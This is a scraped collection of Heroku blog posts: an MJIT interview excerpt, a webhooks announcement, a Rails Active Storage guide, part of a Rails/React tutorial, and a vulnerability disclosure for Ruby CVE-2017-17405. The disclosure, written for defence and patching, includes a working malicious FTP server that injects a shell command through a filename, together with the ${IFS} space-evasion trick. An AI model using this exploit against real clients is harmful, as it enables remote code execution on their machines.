likely have the resources to implement something complex. We would need a lot of compiler specialists. Jonan: So if we could just get 50 or 100 compiler specialists to come and volunteer on Ruby, we'd be all set. I think that's all of them in the world? Matz: Probably. Vlad: Intel has several hundred people working on their compilers. I heard of one optimization from a friend at Intel, 1 optimization out of maybe 300 or 500, and there are 3 people working on that software optimization. It's not even the most important optimization. Matz: You talked to someone at ICC ( Intel C++ Compiler )? Vlad: Yeah, sure. They're always very cautious because they can't share all the information. At Intel the compiler specialists have an advantage because they know the internals of the processor. Modern processors are very complicated interpreters, and even the specialists don't generally know the internals. Even if you are very familiar with an interpreter, it's hard to predict its behavior. Jonan: So you're often working against a black-box implementation to try and make things run, experimenting a lot of the time? Vlad: Yes. There's a guide called the Intel Optimization Guide , and they have some recommendations for what optimizations should be implemented in what way, but this is approximate. Intel employees themselves have much more information, therefore the Intel compiler is the fastest compiler for Intel processors. Jonan: That's cheating. Vlad: Yeah. Aaron: Probably. Vlad: And they actually have been sued and lost. In that case they implemented a special check in the compiler for AMD processors, and they switched off some optimizations. ( Intel's \"cripple AMD\" function described by Agner Fog ) Jonan: Really? Aaron: I think I remember this. Vlad: AMD sued them for this. Jonan: So that would make any code run on an AMD processor slower no matter what? Aaron: Slower, yep. Jonan: ...than the same code running on an Intel processor? Vlad: Yeah. I don't remember exactly but that was about 10 years ago. I don't know the current situation. Jonan: Aaron, do you think that the American Ruby community is interested in helping with this kind of work? Contributing to JIT implementations? I know that Vlad has been working very hard on this, but at this point it's still very early, and I think he may need help to make this the best it can be, especially if it gets merged. Vlad: First of all, I need to stabilize this. It's actually in the very early stages of development. I was quite surprised that the Ruby community took it so seriously so quickly. Jonan: Japanese Rubyists are very excited about this, and I think Rubyists around the world are as well. It's a very timely change. Aaron: I think everybody in the Ruby community is interested in a JIT, and after your hash patches, they absolutely take your work seriously. Vlad: Actually, I picked the hash tables to introduce myself. You can't start working on something like MJIT when you've never worked on a project. Jonan: It was a good introduction. Vlad: I'm not sure about that, as you know, there was serious competition from Yura Sokolov. ( Yura and Vlad had competing hash table implementations ) Jonan: Is there a history there? Did you know him before that interaction? Vlad: No, I didn't know him. Jonan: Well, I think you both, ultimately, handled yourselves very gracefully with that competition. I think a lot of times in programming communities you can see discussions like that devolve very quickly, and I appreciated the professionalism in reading through those posts. I thought you both handled yourselves quite well. I'm very curious about when this work might be merged, but I know it's all very early. Out of the existing potential JITs that are out there now, is this the approach that you like the most, Matz? Matz: As far as I know, yeah. Jonan: Koichi, you feel the same? Koichi: Yes. Jonan: Aaron, you think this is the best of the options we have right now? Aaron: Yeah, I think so. I've seen some people complaining that it generates C code, but I think that's a good idea. Jonan: You like that it generates C code? Aaron: Yeah. Matz: Yeah. Vlad: I think that might be beneficial for GCC, too. I'm already thinking about some new extensions for GCC that could help the MJIT implementation. Matz: Whoa! Koichi: Is it an optimization around strings? Vlad: It's some inlining stuff, so... Matz: I see. Wow. Vlad: Right now, there is huge competition between GCC and LLVM. Everything implemented in GCC is then implemented in LLVM right away, and vice-versa. So if I implement this for GCC, most probably it will be implemented in LLVM. Jonan: I think we would all like that very much. You're an incredibly valuable contributor to have stumbled upon our project. I'm very thankful that you chose Ruby. If MJIT continues to evolve as it has, it looks likely to someday be a part of Ruby. You've said you want to keep it simple because it needs to be maintained by the existing committers in the community. Are there people who have reached out to you to talk about the work you've done so far, or maybe contributed to it in conversation at least? Vlad: Sure. We had talks with Koichi about this, and of course Koichi is very interested in this. Another committer, Kokubun, has asked me a lot of questions. I didn't know why at the time, but I checked yesterday and I found out that he's author of LLRB. Jonan: Yes, the LLVM based JIT for Ruby . So I think Koichi has been quite busy with another project lately, he had his first child about a year ago. He has just-in-time children to interpret right now, but I'm glad to hear that you've had some time to help with the project. Koichi having children is really inconvenient for Ruby as a language. I think just one is good Koichi, maybe no more children. I'm joking of course, please have all of the children you want. We need more Rubyists in the future. Matz: Yeah, we do. Jonan: Do any of you have anything you'd like to share? Aaron: I have so many questions! Jonan: Please, go ahead. Aaron: This isn't about MJIT in particular, but there are so many people working on optimization passes in GCC. Does it ever happen that one team's optimization messes up somebody else's optimization? Vlad: Oh, every time. Aaron: Every time? Vlad: There are very many conflicts between, for example, the instruction scheduling and the register allocator. Conflicts that will never be solved. Jonan: So you just end up racing against each other, trying to optimize over the other? Vlad: Yeah. Matz: So you see fighting amongst teams? Vlad: Actually, I also work on instruction scheduling. Some optimizations are simply contradictory. If, for example, the instruction scheduling team implements code for an optimization, it can actually negate some of the register allocator optimizations. Jonan: I see. What other questions do you have, Aaron? Aaron: I know you said that RTL has speculative instructions, so do you have to perform deoptimizations if you make a mistake? Vlad: Sure, yeah. Aaron: So first off, what is that process? Second, how much is the overhead in terms of speed and memory for doing that? Vlad: The process is simple, actually. When instructions change after we go from a speculative instruction to a universal instruction, we need to generate a new version of machine code. That's how it works. As for the overhead, there should not be significantly increased overhead when MJIT is used. Of course, there is some small overhead, but it should be tiny. When MJIT is used, we shouldn't see performance degradation in comparison to when MJIT is not used. Jonan: So MJIT would always be faster in every case if we were to do this well? For example, sometimes a particular hotspot in the code ends up being deoptimized rather frequently and gets locked out of this type of Method JIT. Vlad: The switching is very fast right now. If we execute only part of this code, and that part is much faster than interpretation, it will consume this overhead for switching from a JITed code execution to RTL interpretation. Of course, there are always corner cases. Jonan: Do you think it's possible that the MJIT would not always be faster Koichi? Koichi: We can always find some edge case. Jonan: I see. Koichi: Always is not a technical term. Jonan: Right, always is not a technical term, we'll just say \"often\" then. We should talk about benchmarking! I'm just kidding, I don't want to talk about benchmarking. There are a lot of benchmarking discussions around this though, and I thought you addressed them very well in your talk today, by saying that there are different ways of benchmarking everything. No matter how you come up with your benchmarks, there will always be distrust around those. I personally think that's healthy, it's good for the community to have different approaches and to highlight different pieces of the data. Aaron: I think benchmarking JITs is hard. It's a hard thing to do. Some benchmarks can favor one implementation over another. So, of course, the other implementation is going to complain if you don't use their way of doing things. Jonan: Then they'll post back to you, and you'll go back and forth forever. So instead of writing benchmarking blog posts, I think that we should write JITs. Aaron: I think part of the problem is that when you're doing the benchmarking you have to apply the same tests to everything, right? So you have to say \"I'm gonna run this one test, and this is how I'm gonna run it. And I'm gonna run it in that same way across all of these versions\", but that one way that you run it could be bad news for one implementation. If you run that same test in a slightly different way, it may be really good news for that implementation. So, of course, they're going to complain, but you have to apply that test the same way. Otherwise, it's not really a good comparison. Matz: Yeah, not a benchmark. Jonan: So the other competing implementations may, for example, have a slow startup time, kind of a burn-in period when they start a benchmark, but then, overall, come out ahead of MJIT. That doesn't necessarily mean that it's a better JIT; it just means that it is faster under those circumstances. Aaron: Honestly, those type of tests make me wonder; how long is acceptable for a warm-up time for a particular application server. At GitHub, we restart our application server maybe every 10 minutes. It's not because we have to restart it every 10 minutes, it's because we're deploying code maybe every 10 or 15 minutes, so we have to restart the server. Of course at night it stays up longer, but during the daytime it's always rolling over. So it makes me wonder, how beneficial would that really be? Jonan: I see. I was thinking about this in the terms of short-lived processes, maybe a background process, where the time to warm up is more impactful. With the movement to cloud services now, you may be spinning up servers on demand, dynamically in response to traffic needs. Each of those new Ruby processes on those servers is going to need this start-up time. I think some of the benchmarking I was looking at was in the microseconds range, some very small period of time, so maybe the impact wouldn't be that large. Since you've stated that performance is not necessarily the number one goal of MJIT, maybe the primary goal of making it simple and easy to maintain means we don't need to pay that much attention to that style of measurement? Koichi: Yeah, actually for me the JVM or JRuby is not really our competitor. The one comparison that matters is the comparison between the Ruby 2.0, which is the virtual machine, and the MJIT, the compilation. That is the real competition. We should not focus too much on comparisons with the JVM. Aaron: Correct me if I'm wrong, but I think the point of MJIT is essentially that we can achieve a 3x speed improvement without giving up simplicity or ease of maintenance. Vlad: Yeah. This is the simplest way to implement a high-quality JIT. Jonan: That's exactly how Ruby has gotten to where it is now, right? Many times, we make decisions for simplicity's sake or ease of use over speed. I think Ruby programmers embrace that choice when they use this language. I know it's hard to predict what will happen in a year or two, but do you think that this MJIT will approximately meet our 3x3 goal by itself? Will we need other changes to get us there? Vlad, what do you think? Vlad: It's, again, about benchmarking. If you ask me about optcarrot , it's already there, but some applications will never be 3 times faster. Jonan: I've heard of this one project called Rails... Vlad: I don't know. I didn't try it. Aaron: Do we even have benchmarks for Rails, besides rubybench.org ? Jonan: Didn't Noah Gibbs write one with Discourse? ( rails_ruby_bench ) Matz: Yeah, Noah is working on it as a standard benchmark for Rails applications. Jonan: Which I think the community desperately needs, right? It would at least be valuable to have. I know it's frustrating sometimes to benchmark using Rails, but given that there are so many Rails programmers out there in the world who are looking for ways to make their stack faster, it could be a big help. I did promise you all that I only needed 30 minutes of your time, and we are at the end of it. Do you want to share some final thoughts? Matz: Yeah. MJIT is pretty promising, so we can expect the future Ruby 3 will be three times faster than Ruby 2.0, as predicted, due to Vlad's work. We have a bright future before us, the future of Ruby. Jonan: Anything you'd like to share Koichi? Koichi: I'm very happy to see such a great project. I want to collaborate with Vlad to evaluate it. I have question for Vlad, when will you become a committer? Vlad: I am not a committer. Koichi: No, so when will you become one? Matz: When are you going to? Do you have any preference? Right now? Vlad: When I implement MJIT I will be ready. Matz: By the way, do you accept pull requests to the MJIT repository on GitHub ? Vlad: I don't know. Actually, I'm an SVN programmer because that's what GCC uses. Matz: Yeah, older projects. Jonan: So if I were to go and make a pull request on GitHub, that would not be the ideal method for you. You'd rather someone sent you a patch? Vlad: I need to look into accepting pull requests. Jonan: There's a chance that someday in the future you will be a committer Vlad. Is that what you were saying Matz? Matz: Yeah. Jonan: That will be a good day. We'll get a cake. Aaron, what do you think about MJIT? Aaron: I think that this design is a \"le-JIT\" approach. Jonan: I should have known better than to ask you about it. I teed that up nicely for you. Aaron: Thank you. I really like the internals of it, I can \"C\" what he did there. Jonan: You can \"C\" it... Aaron: Yep. Jonan: Vlad, do you have anything else you'd like to add for the Ruby programmers of the world? Vlad: Actually, I'm new to the Ruby world, but I've already found that the Ruby community gives a very strong first impression; it's a pleasure. Jonan: Well, it's a pleasure to have you. Thank you so much for all of your help. Aaron: I think you're probably the first person to join the Ruby project because you like the C code. Matz: He probably knows this. Jonan: I think he might. Thank you all for your time.", "date": "2018-04-12,"},
{"website": "Heroku", "title": "Heroku Webhooks: Easier Accessibility, More Options", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/app-webhooks-dashboard", "abstract": "Heroku Webhooks: Easier Accessibility, More Options Posted by Nahid Samsami May 03, 2018 Listen to this article Heroku Webhooks let you create powerful real-time integrations and drive custom operations workflows whenever your Heroku app changes. Today, we're excited to announce a new user experience that makes managing and creating webhooks easier than ever. Now everyone on your team can create a webhook, update it and see deliverability, using a straightforward interface in the Heroku Dashboard. Until now, app webhooks functionality was only available through the Heroku CLI. How to Find the Dashboard Interface for app webhooks You can find the new webhooks interface by going to the Dashboard view for an app, clicking on “More” on the right hand side of the page, and then selecting “View Webbooks” from the dropdown menu. Creating Webhooks in the Dashboard From the webhooks interface, you'll be able to create a webhook subscription and view any webhooks that you've already created, including those created using the CLI. A webhook is essentially an HTTP post request delivered by Heroku to your designated URL when a given change happens to your app. When you create a webhook, you'll be able to select one or more events that you would like to trigger notifications for. For example, you might choose to get a notification whenever an add-on is added to an app. You could set up an email service to handle this notification, and then set up the webhook to send a http POST request to the url for your service. Troubleshooting Your Webhooks Once you've set up your webhook subscription, you'll be able to check that it's all working correctly by going to the webhooks delivery page. From there, you'll be able to see the last 200 webhook deliveries and filter by the status of the delivery (for example, to view those that are incomplete.) For each delivery you'll be able to dig into the payload for troubleshooting. A New Webhook Event Type: dyno webhooks Along with the new webhooks interface, today we are announcing that webhook dyno events are in public beta . For the first time, you'll be able to get notifications for the full lifecycle of a dyno. You'll see webhook dyno events are available as an option when creating a webhook, and are marked with a beta sticker. Customer Spotlight: How Apartment List Uses Webhooks for Slack Integration Apartment List is a Heroku customer who has been using webhooks  to power their open source Slack integration, Heroto  Rooter . Heroku ChatOps provides useful Slack functionality for many customers, but Apartment List was looking to build something more custom. They were excited to discover webhooks as it made building their Slack integration much more seamless. The product of their efforts, Heroto Rooter, is available open source and is an example of how the power of webhooks enables a smoother workflow. Feedback We encourage you to check out webhooks in Dashboard and to create webbooks of your own. If you have any feedback along the way, please share it with ecosystem-feedback@heroku.com", "date": "2018-05-03,"},
{"website": "Heroku", "title": "A Dive into Ruby CVE-2017-17405: Identifying a Vulnerability in Ruby’s FTP Implementation", "author": ["Etienne Stalmans"], "link": "https://blog.heroku.com/identifying-ruby-ftp-cve", "abstract": "A Dive into Ruby CVE-2017-17405: Identifying a Vulnerability in Ruby’s FTP Implementation Posted by Etienne Stalmans April 06, 2018 Listen to this article At Heroku we consistently monitor vulnerability feeds for new issues. Once a new vulnerability drops, we jump into action to triage and determine how our platform and customers may be affected. Part of this process involves evaluating possible attack scenarios not included in the original vulnerability report. We also spend time looking for \"adjacent\" and similar bugs in other products. The following Ruby vulnerability was identified during this process. Vulnerability Triage A vulnerability, CVE-2017-8817 , was identified in libcurl . The FTP function contained an out of bounds read when processing wildcards. As soon as the vulnerability was made public, we went through our various systems to determine how they are affected and to initiate the patching process. Direct libcurl usage inside Heroku´s systems were identified and marked for patching. Once we were confident that all instances were flagged, we started looking into other libraries that might have a similar issue. On a hunch, and because a large number of our customers make use of Ruby, we decided to look at Ruby's FTP implementation. Our approach was twofold, first to determine if Ruby uses libcurl for its FTP functions, and if so, could this vulnerability be triggered in a Ruby application. And second, to determine if Ruby had a custom FTP implementation, whether this also allowed FTP wildcards and, if so, if vulnerabilities also existed in this implementation. To do our investigation we downloaded the latest source code for Ruby, at the time version 2.4.2, and did a quick grep for any mention of FTP. $ grep -i ftp -R *\n\nChangeLog:net/ftp: add a new option ssl_handshake_timeout to Net::FTP.new.\nChangeLog:net/ftp: close the socket directly when an error occurs during TLS handshake.\nChangeLog:Otherwise, @sock.read in Net::FTP#close hungs until read_timeout exceeded.\nChangeLog:net/ftp: close the connection if the TLS handshake timeout is exceeded. It turns out Ruby has its own FTP library and this is packaged as net/ftp . We started looking into the lib/net folder, half expecting a custom C implementation of FTP. Turns out there is a solitary ftp.rb file, and it only weighed in at 1496 lines of code. The Vulnerability While reading through the code in ftp.rb there were a few of the usual suspects to look out for: command %x/command/ IO.popen(command) Kernel.exec Kernel.system Kernel.open(\"| command\") and open(\"| command\") All of the above functions are common vectors to gain Remote Code Execution (RCE) in Ruby applications, and are thus one of the first things to look for during code analysis. It didn't take long to identify a few locations where the open function was being used to access files for reading and writing. Looking at the gettextfile function, we could see a call to open using what appeared to be user controlled data: 778     #\n779     # Retrieves +remotefile+ in ASCII (text) mode, storing the result in\n780     # +localfile+.\n781     # If +localfile+ is nil, returns retrieved data.\n782     # If a block is supplied, it is passed the retrieved data one\n783     # line at a time.\n784     #\n785     def gettextfile(remotefile, localfile = File.basename(remotefile),\n786                     &block) # :yield: line\n787       f = nil\n788       result = nil\n789       if localfile\n790         f = open(localfile, \"w\")\n791       elsif !block_given?\n792         result = String.new\n793       end\n794       begin\n795         retrlines(\"RETR #{remotefile}\") do |line, newline|\n796           l = newline ? line + \"\\n\" : line\n797           f&.print(l)\n798           block&.(line, newline)\n799           result&.concat(l)\n800         end\n801         return result\n802       ensure\n803         f&.close\n804       end\n805     end The localfile value would trigger command execution if the value was | os command . In general use, most users would likely provide their own localfile value and would not rely on the default of File.basename(remotefile) however, in some situations, such as listing and downloading all files in a FTP share, the remotefile value would be controlled by the remote host and could thus be manipulated into causing RCE. Since the file path is simply a string returned by the server (either ls -l style for the LIST command, or filenames for NLIST ), there is no guarantee that filename will be a valid filename. PoC We wrote a basic Ruby client that we could use to test the vulnerability. This client simply connects to a server, requests a list of files, and then tries to download all the files. require 'net/ftp'\nhost = '172.17.0.4'\nport = 2121\n\nNet::FTP.const_set('FTP_PORT',port)\nNet::FTP.open(host) do |ftp|\n ftp.login\n fileList = ftp.nlst('*')\n fileList.each do |file|\n       ftp.gettextfile(file)\n end\nend Our server would need to respond to the NLIST command with a filename containing our command to executed. Since no validation or sanitization is done on the supplied filename, it would simply be passed straight to the open function and our command would execute. The only caveat being that our \"filename\" needs to start with | . The PoC server code is not the best Ruby code you will ever see, but it was good enough to trigger the vulnerability and provide us with RCE. The server needs to simulate the handshake of an FTP connection. This fools the client into thinking it is connecting to a real FTP server and does the bare minimum to get the client to request a list of files. require 'socket'\nhost = '172.17.0.4'\nport = 2121\nhostsplit = host.tr('.',',')\n\nserver = TCPServer.new port\n\nloop do\n Thread.start(server.accept) do |client|\n   client.puts \"220 Attack FTP\\r\\n\"\n   r = client.gets\n   puts r\n   client.puts \"331 password please - version check\\r\\n\"\n   r = client.gets\n   puts r\n   client.puts \"230 User logged in\\r\\n\"\n   r = client.gets\n   puts r\n   client.puts \"230 more data please!\\r\\n\"\n   r = client.gets\n   puts r\n   client.puts \"230 more data please!\\r\\n\"\n   r = client.gets\n   puts r\n   wait = true\n   psv = Thread.new do\n       pserver = TCPServer.new 23461\n       Thread.start(pserver.accept) do |pclient|\n           while wait do\n           end\n           pclient.puts \"|echo${IFS}$(id)${IFS}>pang\\r\\n\"\n           pclient.close\n       end\n   end\n\n   sleep 1\n\n   client.puts \"227 Entering Passive Mode (\"+hostsplit+\",91,165)\\r\\n\"\n   r = client.gets\n   puts r\n\n   psv.join\n\n   client.puts \"150 Here comes the directory listing.\\r\\n\"\n   wait = false\n\n   client.puts \"226 Directory send OK.\\r\\n\"\n   r = client.gets\n   puts r\n   client.puts \"221 goodbye\\r\\n\"\n   client.close\n end\nend The actual exploit happens when we supply the filelist , with pclient.puts \"|echo${IFS}$(id)${IFS}>pang\\r\\n\" , which will result in echo $(id) > pang being run on the connecting client. If our exploitation is successful, we would see a new file created on the client, containing the output of the id command. Although not strictly necessary, we \"encoded\" the space using ${IFS} , which is a special shell variable called the Internal Field Separator. This is useful in cases where spaces cause issues in your payloads. Report and Fix We reported the vulnerability to the Ruby team shortly after discovery. The response was excellent and the bug was fixed within hours. The Ruby team simply replaced the open function with the File.open function, which is not vulnerable to command injection. The fix was included in the stable release of Ruby, version 2.4.3 . We were also assigned CVE-2017-17405 . The following versions of Ruby are all affected by this vulnerability: Ruby 2.2 series: 2.2.8 and earlier Ruby 2.3 series: 2.3.5 and earlier Ruby 2.4 series: 2.4.2 and earlier Ruby 2.5 series: 2.5.0-preview1 prior to trunk revision r61242 Conclusion System hygiene (ephemerality, immutability, patching, etc) is the foundation of securable systems. Safe and open communication around vulnerabilities being patched raises awareness of similar weaknesses affecting our entire computing ecosystem. You might think of this as how our immunity to classes of vulnerabilities evolve, protecting our infrastructure. At Heroku we closely monitor security research and vulnerability disclosure. Our belief and investment in the safe discussion around vulnerabilities works to ensure our software stack is kept up to date and our customers are protected. Patch management forms an integral part of the security life-cycle and cannot be a static process of simply applying patches. Reviewing and understanding the underlying causes of vulnerabilities being patched can help identify further vulnerabilities in the affected software, or even completely different software packages. We closely monitor security research and vulnerability disclosure to ensure our software stack is kept up to date and our customers are protected. ruby vulnerability cve security", "date": "2018-04-06,"},
{"website": "Heroku", "title": "Rails 5.2 Active Storage: Previews, Poppler, and Solving Licensing Pitfalls", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/rails-active-storage", "abstract": "Rails 5.2 Active Storage: Previews, Poppler, and Solving Licensing Pitfalls Posted by Richard Schneeman May 10, 2018 Listen to this article Rails 5.2 was just released last month with a major new feature: Active Storage. Active Storage provides file uploads and attachments for Active Record models with a variety of backing services (like AWS S3). While libraries like Paperclip exist to do similar work, this is the first time that such a feature has been shipped with Rails. At Heroku, we consider cloud storage a best practice, so we've ensured that it works on our platform. In this post, we'll share how we prepared for the release of Rails 5.2, and how you can deploy an app today using the new Active Storage functionality. Trust but Verify At Heroku, trust is our number one value. When we learned that Active Storage was shipping with Rails 5.2, we began experimenting with all its features. One of the nicest conveniences of Active Storage is its ability to preview PDFs and videos. Instead of linking to assets via text, a small screenshot of the PDF or Video will be extracted from the file and rendered on the page. The beta version of Rails 5.2 used the popular open source tools FFmpeg and MuPDF to generate video and PDF previews. We vetted these new binary dependencies through both our security and legal departments, where we found that MuPDF licensed under AGPL and requires a commercial license for some use. Had we simply added MuPDF to Rails 5.2+ applications by default, many of our customers would have been unaware that they needed to purchase MuPDF to use it commercially. The limiting AGPL license was brought to public attention in September 2017. To prepare for the 5.2 release, our engineer Terence Lee worked to update Active Storage so that this PDF preview feature could also use an open-source backend without a commercial license. We opened a PR to Rails introducing the ability to use poppler PDF as an alternative to MuPDF in February of 2018. The PR was merged roughly a month later, and now any Rails 5.2 user - on or off Heroku - can render PDF previews without having to purchase a commercial license. Active Storage on Heroku Example App If you've already got an app that implements Active Storage you can jump over to our DevCenter documentation on Active Storage . Alternatively, you can use our example app. Here is a Rails 5.2 app that is a digital bulletin board allowing people to post videos, pdfs, and images. You can view the source on GitHub or deploy the app with the Heroku button: Note: This example app requires a paid S3 add-on. Here's a video example of what the app does. When you open the home page, select an appropriate asset, and then submit the form. In the video, the mp4 file is uploaded to S3 and then a preview is generated on the fly by Rails with the help of ffmpeg . Pretty neat. Active Storage on Heroku If you deployed the example app using the button, it's already configured to work on Heroku via the app.json , however if you've got your own app that you would like to deploy, how do you set it up so it works on Heroku? Following the DevCenter documentation for Active Storage , you will need a file storage service that all your dynos can talk to. The example uses a Heroku add-on for S3 called Bucketeer , though you can also use existing S3 credentials. To get started, add the AWS gem for S3 to the Gemfile, and if you’re modifying images as well add Mini Magick: gem \"aws-sdk-s3\", require: false\ngem 'mini_magick', '~> 4.8' Don't forget to $ bundle install after updating your Gemfile. Next up, add an amazon option in your config/storage.yml file to point to the S3 config, we are using config set by Bucketeer in this example: amazon:\n  service: S3\n  access_key_id: <%= ENV['BUCKETEER_AWS_ACCESS_KEY_ID'] %>\n  secret_access_key: <%= ENV['BUCKETEER_AWS_SECRET_ACCESS_KEY'] %>\n  region: <%= ENV['BUCKETEER_AWS_REGION'] %>\n  bucket: <%= ENV['BUCKETEER_BUCKET_NAME'] %> Then make sure that your app is set to use the :amazon config store in production: config.active_storage.service = :amazon If you forget this step, the default store is to use :local which saves files to disk. This is not a scalable way to handle uploaded files in production. If you accidentally deploy this to Heroku, it will appear that the files were uploaded at first, but then they will disappear on random requests if you're running more than one dyno. The files will go away altogether when the dynos are restarted. You can get more information about ephemeral disk of Heroku in the DevCenter . Finally, the last thing you'll need to get this to work in production is to install a custom buildpack that installs the binary dependencies ffmpeg and poppler which are used to generate the asset previews: $ heroku buildpacks:add -i 1 https://github.com/heroku/heroku-buildpack-activestorage-preview Once you’re done you can deploy to Heroku! Adding Active Storage to an Existing App If your app doesn't already have Active Storage, you can add it. First, you'll need to enable Active Storage blob storage by running: $ bin/rails active_storage:install This will add a migration that lets Rails track the uploaded files. Next, you'll need a model to \"attach\" files onto. You can use an existing model, or create a new model. In the example app a mostly empty bulletin model is used: $ bin/rails generate scaffold bulletin Next, run the migrations on the application: $ bin/rails db:migrate After the database is migrated, update the model to let Rails know that you intend to be able to attach files to it: class Bulletin < ApplicationRecord\n  has_one_attached :attachment\nend Once that's done, we will need three more pieces: a form for uploading attachments, a controller to save attachments, and then a view for rendering the attachments. If you have an existing form you can add an attachment field via the file_field view helper like this: <%= form.file_field :attachment %> You can see an example of a form with an attachment in the example app . Once you have a form, you will need to save the attachment. In this example app, the home page contains the form and the view. In the bulletin controller the attachment is saved and then the user is redirected back to the main bulletin list: def create\n  @bulletin = Bulletin.new()\n  @bulletin.attachment.attach(params[:bulletin][:attachment])\n  @bulletin.save!\n\n  redirect_back(fallback_location: root_path)\nend Finally, in the welcome view we iterate through each of the bulletin items and, depending on the type of attachment we have, render it differently. In Active Storage the previewable? method will return true for PDFs and Videos provided the system has the right binaries installed. The variable? method will return true for images if mini_magick is installed. If neither of these things is true then, the attachment is likely a file that is best viewed after being downloaded. Here's how we can represent that logic : <ul class=\"no-bullet\">\n  <% @bulletin_list.each do |bulletin| %>\n    <li>\n      <% if bulletin.attachment.previewable? %>\n        <%= link_to(image_tag(bulletin.attachment.preview(resize: \"200x200>\")),  rails_blob_path(bulletin.attachment, disposition: \"attachment\"))\n        %>\n      <% elsif bulletin.attachment.variable? %>\n        <%= link_to(image_tag(bulletin.attachment.variant(resize: \"200x200\")), rails_blob_path(bulletin.attachment, disposition: \"attachment\"))%>\n      <% else %>\n        <%= link_to \"Download file\", rails_blob_path(bulletin.attachment, disposition: \"attachment\") %>\n      <% end %>\n    </li>\n  <% end %>\n</ul> Once you've got all these pieces in your app, and configured Active Storage to work in production, your users can enjoy uploading and downloading files with ease. rails ruby active storage s3 license", "date": "2018-05-10,"},
{"website": "Heroku", "title": "A Rock Solid, Modern Web Stack—Rails 5 API + ActiveAdmin + Create React App on Heroku", "author": ["Charlie Gleason"], "link": "https://blog.heroku.com/a-rock-solid-modern-web-stack", "abstract": "A Rock Solid, Modern Web Stack—Rails 5 API + ActiveAdmin + Create React App on Heroku Posted by Charlie Gleason May 16, 2018 Listen to this article How to blend a rock-solid CMS and API with the absolute best in front-end tooling, built as a single project and hosted seamlessly on Heroku. Rails is an incredible framework, but modern web development has moved to the front-end, meaning sometimes you don’t need all the bulk of the asset pipeline and the templating system. In Rails 5 you can now create an API-only Rails app, meaning you can build your front-end however you like—using Create React App, for example. It’s no longer 100% omakase . And for projects that don’t need CMS-like capabilities, Rails and that works pretty great straight away. Create React App even supports proxying API requests in development , so you can be running two servers locally without having to litter your app with if NODE_ENV === ‘development’ . Still, I’ve worked with ActiveAdmin on a few projects, and as an interface between you and the database, it’s pretty unmatched for ease of use. There are a host of customisation options, and it’s pretty easy for clients to use if you need a CMS. The issue is that removing the non-API bits of Rails breaks it. Not ideal. But all is not lost—with a couple of steps you can be running a Rails 5 app, API-only, serving your Create React App client on the front end, with full access to ActiveAdmin. We’re going to build it, then we’re going to deploy it to Heroku , and then we’re going to celebrate with a delicious, healthy beverage of your choosing. Because we will have earned it. And given that theme, we’re going to build an app that shows us recipes for smoothies. It’s thematically appropriate! So, what are we going to use? Create React App All the power of a highly-tuned Webpack config without the hassle. Rails in API-only mode Just the best bits, leaving React to handle the UI. ActiveAdmin An instant CMS backend. Seamless deployment on Heroku Same-origin (so no CORS complications) with build steps to manage both Node and Ruby. Single page app support with React Router So you can have lightning fast rendering on the front end. And it’ll look something like this: Our app, List of Ingredients , which really does what it says on the tin. If you want to skip ahead to the finished repo, you can do so here , and if you want to see it in action, you do that here . Let’s get started, shall we? Step 1: Getting Rails 5 set up With that delicious low-carb API-only mode There are a ton of great tutorials on getting Ruby and Rails set up in your local development environment. https://gorails.com/setup/ will work out your operating system, and will walk you through getting Rails 5.2.0 installed. If you’ve already got Rails 5, awesome. The best way to check that is to run rails -v in your terminal. If you see Rails 5.2.0 , we’re ready to roll. So, first up, start a new Rails app with the --api flag: mkdir list-of-ingredients\ncd list-of-ingredients\nrails new . --api Before you commit, add /public to .gitignore , as this will be populated at build by our front end. Your .gitignore file should look something like this: # See https://help.github.com/articles/ignoring-files for more about ignoring files.\n#\n# If you find yourself ignoring temporary files generated by your text editor\n# or operating system, you probably want to add a global ignore instead:\n#   git config --global core.excludesfile '~/.gitignore_global'\n\n# Ignore bundler config.\n/.bundle\n\n# Ignore the default SQLite database.\n/db/*.sqlite3\n/db/*.sqlite3-journal\n\n# Ignore all logfiles and tempfiles.\n/log/*\n/tmp/*\n!/log/.keep\n!/tmp/.keep\n\n# Ignore uploaded files in development\n/storage/*\n\n.byebug_history\n\n# Ignore master key for decrypting credentials and more.\n/config/master.key\n\n# Ignore public, as it is built on deploy\n# Place files for /public in /client/public\n/public Right. We are already part of the way to making a delicious smoothie. Maybe use this time to congratulate yourself, because you’re doing great. Once the install process has finished, you can fire up Rails: bin/rails s -p 3001 It’ll do some stuff, eventually telling you that it’s listening on http://localhost:3001 . If you visit it, you should see something like this: Yay Rails! Look—there’s even a kitten in that illustration! So great. Let's quit Rails and get ready for step 2. Step 2: Getting ActiveAdmin working With a couple of small tweaks to Rails ( Thanks to Roman Rott for inspiring this bit. ) So, why do we need to make any changes at all to get Rails up and running? It's because when we make a Rails API app, Rails isn't expecting to serve HTML pages, and because we're adding ActiveAdmin , we actually need it to. Before you install ActiveAdmin, you'll need to switch a couple of Rails classes and add some middleware that it relies on. First, you’ll need to swap your app/controllers/application_controller.rb from using the API to using Base , being sure to add in protect_from_forgery with: :exception . So your application_controller.rb should go from looking like this: class ApplicationController < ActionController::API\nend To something more like this: class ApplicationController < ActionController::Base\n    protect_from_forgery with: :exception\nend As Carlos Ramirez mentions , this requirement is due to a design decision from ActiveAdmin, meaning any controllers we make that inherit from ApplicationController won’t take advantage of the slimmed down API version. There is a work around, though. Add a new api_controller.rb file to your app/controllers : class ApiController < ActionController::API\nend Now you can get any new controllers you make to inherit from ApiController , not ApplicationController . For example, if you were making an ExampleController , it might look like this: class ExampleController < ApiController\nend From there we’ll need to ensure that the middleware has the stuff it needs for ActiveAdmin to function correctly. API mode strips out cookies and the flash, but we can 100% put them back. In your config/application.rb add these to the Application class: # Middleware for ActiveAdmin\nconfig.middleware.use Rack::MethodOverride\nconfig.middleware.use ActionDispatch::Flash\nconfig.middleware.use ActionDispatch::Cookies\nconfig.middleware.use ActionDispatch::Session::CookieStore You’ll also need to add sprockets/railtie back in by uncommenting it: require \"sprockets/railtie\" Your config/application.rb should look something like this: require_relative 'boot'\n\nrequire \"rails\"\n# Pick the frameworks you want:\nrequire \"active_model/railtie\"\nrequire \"active_job/railtie\"\nrequire \"active_record/railtie\"\nrequire \"active_storage/engine\"\nrequire \"action_controller/railtie\"\nrequire \"action_mailer/railtie\"\nrequire \"action_view/railtie\"\nrequire \"action_cable/engine\"\nrequire \"sprockets/railtie\"\nrequire \"rails/test_unit/railtie\"\n\n# Require the gems listed in Gemfile, including any gems\n# you've limited to :test, :development, or 